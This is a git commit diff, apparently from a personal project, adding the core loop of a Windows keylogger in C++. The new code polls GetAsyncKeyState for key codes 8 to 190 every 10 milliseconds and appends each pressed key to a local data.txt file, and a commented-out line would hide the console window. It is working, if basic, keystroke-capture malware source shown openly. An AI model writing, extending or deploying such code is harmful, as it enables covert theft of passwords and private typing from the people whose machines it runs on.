dda5c18926936991b61dccea2ddeef0e980db3b1
JessChris <j.christodoulou@outlook.com>
2022-01-23 18:06:17 +0200

    Basic main function capabilities have been implemented and added. I will use the StartLog function for special case characters instead. Very Self Explanatory code.

--- keyLoggercpp.cpp
+++ keyLoggercpp.cpp
@@ -1,6 +1,5 @@
 #include <iostream>
 #include <fstream>
-
 #include <Windows.h>
 using namespace std;
 
@@ -11,10 +10,32 @@ void StartLog(string input);
 int main()
 {
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//cout << "hello";
+	//StartLog("hi");
 
-	cout << "hello";
-	StartLog("hi");
+	char InputChar;
+
+	for (;;)
+	{
+		Sleep(10);
+		for (int InputChar=8; InputChar<=190; InputChar++)
+		{
+			if (GetAsyncKeyState(InputChar) == -32767) {
+				fstream DataLog;
+				DataLog.open("data.txt", fstream::app);
+
+				if (DataLog.is_open())
+				{
+					DataLog << char(InputChar);
+					DataLog.close();
+				}
+			}
+		}
+	}
 }
+
+	
+
 
 //Pretty self explanatory. File is opened and the string inputted is entered.
 //Since its still an initial phase it will only print "hi" into the txt accordng to main.
